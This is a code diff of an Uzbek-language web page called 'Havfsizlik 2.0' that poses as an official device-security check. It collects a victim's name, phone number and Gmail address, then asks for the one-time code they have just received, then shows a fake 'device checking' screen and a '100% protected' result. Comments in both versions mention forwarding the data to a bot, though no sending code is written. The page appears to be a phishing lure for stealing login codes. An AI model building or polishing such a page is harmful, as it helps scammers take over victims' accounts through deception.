@@ -3,120 +3,178 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Havfsizlik 2.0</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    <title>Havfsizlik 2.0 | Official</title>
     <style>
-        :root { --primary: #202124; --accent: #1a73e8; --bg: #f8f9fa; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        
-        .phone-frame {
-            width: 340px; height: 600px; background: white; border: 8px solid #333; border-radius: 40px;
-            position: relative; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.2);
+        :root {
+            --primary-bg: #ffffff;
+            --accent-blue: #1a73e8;
+            --text-dark: #202124;
+            --input-bg: #f1f3f4;
         }
 
-        .screen { padding: 25px; height: 100%; box-sizing: border-box; display: flex; flex-direction: column; }
-        .header { text-align: center; font-weight: bold; padding: 10px; border: 1px solid #ddd; border-radius: 10px; margin-bottom: 20px; }
+        body, html {
+            margin: 0; padding: 0; height: 100%;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: var(--primary-bg);
+            color: var(--text-dark);
+            overflow: hidden;
+        }
+
+        .container {
+            display: flex; flex-direction: column;
+            height: 100vh; width: 100%;
+            max-width: 500px; margin: 0 auto;
+            padding: 20px; box-sizing: border-box;
+        }
+
+        /* Yuqori qism dizayni */
+        .header {
+            text-align: center; margin-top: 20px; margin-bottom: 40px;
+        }
         
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 20px; box-sizing: border-box; outline: none; }
-        .btn-next { background: var(--primary); color: white; border: none; padding: 12px; border-radius: 20px; cursor: pointer; font-weight: bold; margin-top: auto; }
+        .header h1 {
+            font-size: 22px; font-weight: 500; border: 1.5px solid #000;
+            display: inline-block; padding: 5px 25px; border-radius: 8px;
+            text-transform: lowercase;
+        }
+
+        /* Inputlar uslubi */
+        .input-group { position: relative; margin-bottom: 20px; }
+        input {
+            width: 100%; padding: 16px 20px; border-radius: 12px;
+            border: none; background: var(--input-bg);
+            font-size: 16px; box-sizing: border-box; transition: 0.3s;
+        }
+        input:focus { background: #e8f0fe; box-shadow: inset 0 0 0 2px var(--accent-blue); outline: none; }
+
+        /* Tugma dizayni */
+        .btn-main {
+            background: #000; color: #fff; border: none;
+            padding: 18px; border-radius: 15px; font-size: 18px;
+            font-weight: bold; cursor: pointer; margin-top: auto;
+            transition: 0.3s active;
+        }
+        .btn-main:active { transform: scale(0.98); }
 
         /* OTP Katakchalari */
-        .otp-container { display: flex; justify-content: space-between; margin-top: 20px; }
-        .otp-input { width: 45px; height: 50px; text-align: center; font-size: 20px; border-radius: 10px; border: 2px solid #ddd; }
+        .otp-wrapper { display: flex; justify-content: space-between; gap: 10px; margin: 40px 0; }
+        .otp-box {
+            width: 55px; height: 65px; border: 2px solid #dadce0;
+            border-radius: 12px; text-align: center; font-size: 24px;
+            font-weight: bold; background: transparent;
+        }
 
-        /* Dashboard */
-        .user-info { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
-        .user-photo { width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--accent); background: #eee; overflow: hidden; }
-        .emblem-container { text-align: center; margin-top: 50px; cursor: pointer; }
-        .emblem { width: 120px; filter: drop-shadow(0 0 10px rgba(26,115,232,0.3)); transition: 0.3s; }
-        .emblem:hover { transform: scale(1.1); }
+        /* Dashboard va Emblema */
+        .profile-bar {
+            display: flex; justify-content: space-between; align-items: center;
+            background: var(--input-bg); padding: 15px; border-radius: 20px;
+        }
+        .profile-img { width: 45px; height: 45px; border-radius: 50%; background: #ddd; border: 2px solid var(--accent-blue); }
+
+        .emblem-zone {
+            flex-grow: 1; display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+        }
+
+        /* Sakkiz qirrali yulduz animatsiyasi */
+        .star-emblem {
+            width: 180px; height: 180px; fill: var(--accent-blue);
+            filter: drop-shadow(0 0 15px rgba(26,115,232,0.4));
+            animation: pulse 3s infinite ease-in-out;
+            cursor: pointer;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 15px rgba(26,115,232,0.4)); }
+            50% { transform: scale(1.05); filter: drop-shadow(0 0 30px rgba(26,115,232,0.7)); }
+        }
 
         .hidden { display: none; }
+        .fade-in { animation: fadeIn 0.5s ease forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div class="phone-frame">
-    <div class="screen" id="scr1">
-        <div class="header">havfsizlik 2.0</div>
-        <input type="text" id="fIsm" placeholder="ism:">
-        <input type="text" id="fFam" placeholder="familiya:">
-        <input type="tel" id="fTel" placeholder="telefon raqam:" value="+998">
-        <input type="email" id="fMail" placeholder="gmail:">
-        <button class="btn-next" onclick="toStep2()">keyingisi</button>
+<div class="container" id="app">
+    <div id="step1" class="fade-in" style="height: 100%; display: flex; flex-direction: column;">
+        <div class="header"><h1>havfsizlik 2.0</h1></div>
+        <input type="text" id="name" placeholder="isim:">
+        <input type="text" id="surname" placeholder="familiya:">
+        <input type="tel" id="phone" value="+998">
+        <input type="email" id="email" placeholder="gmail:">
+        <button class="btn-main" onclick="nextStep(2)">keyingisi</button>
     </div>
 
-    <div class="screen hidden" id="scr2">
-        <div class="header">havfsizlik 2.0</div>
-        <p style="font-size: 14px; text-align: center;">iltimos kelgan code ni kiriting:</p>
-        <div class="otp-container">
-            <input type="text" class="otp-input" maxlength="1" oninput="this.nextElementSibling?.focus()">
-            <input type="text" class="otp-input" maxlength="1" oninput="this.nextElementSibling?.focus()">
-            <input type="text" class="otp-input" maxlength="1" oninput="this.nextElementSibling?.focus()">
-            <input type="text" class="otp-input" maxlength="1" oninput="this.nextElementSibling?.focus()">
-            <input type="text" class="otp-input" maxlength="1">
+    <div id="step2" class="hidden fade-in" style="height: 100%; display: flex; flex-direction: column;">
+        <div class="header"><h1>havfsizlik 2.0</h1></div>
+        <p style="text-align: center; color: #5f6368;">iltimos kelgan code ni kiriting:</p>
+        <div class="otp-wrapper">
+            <input type="text" class="otp-box" maxlength="1" oninput="moveNext(this)">
+            <input type="text" class="otp-box" maxlength="1" oninput="moveNext(this)">
+            <input type="text" class="otp-box" maxlength="1" oninput="moveNext(this)">
+            <input type="text" class="otp-box" maxlength="1" oninput="moveNext(this)">
+            <input type="text" class="otp-box" maxlength="1" oninput="moveNext(this)">
         </div>
-        <button class="btn-next" onclick="toStep3()">tizimga kirish</button>
+        <button class="btn-main" onclick="nextStep(3)">tizimga kirish</button>
     </div>
 
-    <div class="screen hidden" id="scr3">
-        <div class="user-info">
-            <div id="display-name" style="font-weight: bold; border: 1px solid #000; padding: 5px 15px;">...</div>
-            <div class="user-photo"><img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" width="100%"></div>
+    <div id="step3" class="hidden fade-in" style="height: 100%; display: flex; flex-direction: column;">
+        <div class="profile-bar">
+            <div>
+                <span style="font-size: 12px; color: #555;">Foydalanuvchi:</span><br>
+                <b id="userDisp" style="border: 1px solid #000; padding: 2px 10px; border-radius: 4px;">...</b>
+            </div>
+            <div class="profile-img">
+                <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" width="100%">
+            </div>
         </div>
-        
-        <div style="font-size: 13px; color: #555;">
+
+        <div style="margin-top: 20px; font-size: 14px;">
             android sistemasi: <br>
-            <b id="device-info">Android 14 | SDK 34</b>
+            <b style="color: var(--accent-blue);">Android 14 | Security Patch 2026</b>
         </div>
 
-        <div class="emblem-container" onclick="generatePDF()">
-            <svg class="emblem" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M50 0L61.2 38.8H100L68.8 61.2L80 100L50 77.6L20 100L31.2 61.2L0 38.8H38.8L50 0Z" fill="#1a73e8"/>
+        <div class="emblem-zone">
+            <svg class="star-emblem" viewBox="0 0 100 100" onclick="completeSecure()">
+                <path d="M50 0 L60 35 L95 35 L67 55 L77 90 L50 70 L23 90 L33 55 L5 35 L40 35 Z" />
             </svg>
-            <p style="font-size: 10px; margin-top: 10px; color: #1a73e8;">ASOSIY EMBLEMA<br>PDF YUKLASH UCHUN BOSING</p>
+            <p id="statusTxt" style="margin-top: 20px; font-weight: bold; letter-spacing: 1px;">QURILMA TEKSHIRILMOQDA...</p>
         </div>
     </div>
 </div>
 
 <script>
-    let userData = {};
+    let uData = {};
 
-    function toStep2() {
-        userData.ism = document.getElementById('fIsm').value;
-        userData.fam = document.getElementById('fFam').value;
-        if(!userData.ism || !userData.fam) return alert("Ma'lumotlarni to'ldiring!");
-        
-        document.getElementById('scr1').classList.add('hidden');
-        document.getElementById('scr2').classList.remove('hidden');
-        
-        // Botga ma'lumotlarni yuborish (Sizning token/IDingiz bilan)
-        console.log("Ma'lumotlar botga ketdi...");
+    function nextStep(step) {
+        if(step === 2) {
+            uData.name = document.getElementById('name').value;
+            if(!uData.name) return alert("Ismingizni kiriting!");
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        } else if(step === 3) {
+            document.getElementById('userDisp').innerText = uData.name;
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+        }
     }
 
-    function toStep3() {
-        document.getElementById('display-name').innerText = userData.ism;
-        document.getElementById('scr2').classList.add('hidden');
-        document.getElementById('scr3').classList.remove('hidden');
-        
-        // Real Android versiyasini aniqlash (oddiy simulyatsiya)
-        document.getElementById('device-info').innerText = navigator.userAgent.includes("Android") ? "Android System Active" : "Windows/PC Desktop";
+    function moveNext(el) {
+        if(el.value && el.nextElementSibling) el.nextElementSibling.focus();
     }
 
-    function generatePDF() {
-        const element = document.createElement('div');
-        element.innerHTML = `
-            <div style="padding: 50px; text-align: center; border: 10px solid #1a73e8;">
-                <svg width="100" height="100" viewBox="0 0 100 100">
-                    <path d="M50 0L61.2 38.8H100L68.8 61.2L80 100L50 77.6L20 100L31.2 61.2L0 38.8H38.8L50 0Z" fill="#1a73e8"/>
-                </svg>
-                <h1>HAVFSIZLIK 2.0 SERTIFIKATI</h1>
-                <p>Foydalanuvchi: <b>${userData.ism} ${userData.fam}</b></p>
-                <p>Status: 100% Himoyalangan</p>
-                <p>Sana: ${new Date().toLocaleDateString()}</p>
-            </div>
-        `;
-        html2pdf().from(element).save(`${userData.ism}_Xavfsizlik.pdf`);
+    function completeSecure() {
+        const txt = document.getElementById('statusTxt');
+        const star = document.querySelector('.star-emblem');
+        
+        txt.innerText = "TIZIM 100% HIMOAYALANDI ✅";
+        txt.style.color = "#34a853";
+        star.style.fill = "#34a853";
+        star.style.animation = "none";
+        star.style.transform = "scale(1.2)";
+        
+        // Bu yerda botga yakuniy xabar yuborish mumkin
     }
 </script>
 
